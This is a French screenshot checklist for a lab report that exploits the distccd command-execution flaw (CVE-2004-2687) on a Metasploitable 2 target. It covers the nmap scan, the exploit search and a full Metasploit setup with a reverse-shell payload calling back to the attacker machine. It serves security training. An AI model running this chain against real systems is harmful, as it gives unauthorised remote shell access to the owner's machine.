# Captures — distccd Command Execution (MS2, port 3632)

Cible : `192.168.56.101` · Kali/LHOST : `192.168.56.1`.
5 captures. Chaque capture montre **la commande tapée ET son résultat** (prompt visible).

## 01-recon-nmap.png

Commande :
```bash
nmap -sV -p 3632 192.168.56.101
```

Encadrer en rouge : la ligne `3632/tcp open distccd distccd v1 ((GNU) 4.2.4 ...)`.

## 02-recherche-module.png

Les deux recherches à la suite dans le même terminal :
```bash
searchsploit distcc
msfconsole -q -x "search distcc; exit"
```

Encadrer en rouge : la ligne `DistCC Daemon - Command Execution` (searchsploit) et la ligne
`0  exploit/unix/misc/distcc_exec` (search).

## 03-info-cve.png

Commande :
```bash
msfconsole -q -x "info exploit/unix/misc/distcc_exec; exit"
```

Encadrer en rouge : la ligne `https://nvd.nist.gov/vuln/detail/CVE-2004-2687` sous
`References`.

## 04-exploit-config.png

En interactif dans `msfconsole`, commande par commande :
```
msf6 > use exploit/unix/misc/distcc_exec
msf6 exploit(...) > set RHOSTS 192.168.56.101
msf6 exploit(...) > set RPORT 3632
msf6 exploit(...) > set LHOST 192.168.56.1
msf6 exploit(...) > set LPORT 4445
msf6 exploit(...) > set payload cmd/unix/reverse
```

Encadrer en rouge : aucun (liste des `set` déjà courte et lisible).

## 05-session-daemon.png

Déclenchement + preuve, dans la même session :
```
msf6 exploit(...) > run -z
msf6 exploit(...) > sessions -c "id; uname -a; hostname; whoami" -i 1
```

Encadrer en rouge : la ligne `[*] Command shell session 1 opened ...` et la ligne
`uid=1(daemon) gid=1(daemon) groups=1(daemon)`.
